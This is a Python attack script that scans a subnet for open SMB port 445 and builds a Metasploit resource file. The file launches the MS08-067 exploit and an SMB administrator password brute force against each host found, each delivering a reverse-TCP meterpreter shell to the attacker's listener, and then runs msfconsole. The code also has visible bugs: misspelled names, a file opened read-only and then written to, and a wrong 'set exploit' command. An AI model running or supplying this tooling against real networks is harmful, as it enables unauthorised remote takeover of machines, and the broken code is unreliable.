#! /usr/bin/python3
# _*_ coding:utf-8 _*_

__author__ = 'Junliang.Zhong'


import os
import sys
import optparse
import nmap


def findTgts(subNet):
	nmScan = nmap.PortScanner()
	nmScan.scan(subNet, '445')
	tgtHosts = []
	for host in nmScan.all_hosts():
		state = nmScan[host]['tcp'][445]['state']
		if state == 'open':
			print('[+] Found Target Host: ' + host)
			tgtHots.append(host)
	return tgtHosts


def setupHandler(configFile, lhost, lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('exploit -j -z')
	configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
	configFile.write('set exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST ' + str(tgtHost) + '\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('exploit -j -z\n')


def smBrute(configFile, tgtHost, passwdFile, lhost, lport):
	username = 'administrator'
	pf = open(passwdFile, 'r')
	for password in pf.readlines():
		password = password.strip('\n')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + str(tgtHost) + '\n')
		configFile.write('set payload windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT ' + str(lport) + '\n')
		configFile.write('set LHOST ' + lhost + '\n')
		configFile.write('exploit -j -z\n')

def main():
	configFile = open('meta.rc', 'r')
	parser = optparse.OptionParser('[-] Usage%prog -H <RHOST[s] -l <LHOST> [-p <LPORT> -F <Password File>]')
	parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'specify the target address[es]')
	parser.add_option('-p', dest = 'lport', type = 'string', help = 'specify the listen port')
	parser.add_option('-l', dest = 'lhost', type = 'string', help = 'specify the listen address')
	parser.add_option('-F', dest = 'passwdFile', type = 'string', help = 'specify the password file for SMB brute force attemp')

	(options, args) = parser.parse_args()

	if (options.tgtHost == None) | (options.lhost == None):
		print(parser.usage)
		exit(0)

	lhost = options.lhost 
	lport = options.lport 
	if lport == None:
		lport = '1337'
	passwdFile = options.passwdFile
	tgtHosts = findTgts(options.tgtHost)
	setupHandler(configFile, lhost, lport)

	for tgtHost in tgtHosts:
		confickerExploit(configFile, tgtHost, lhost, lport)
		if passwdFile != None:
			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
		configFile.close()
		os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
	main()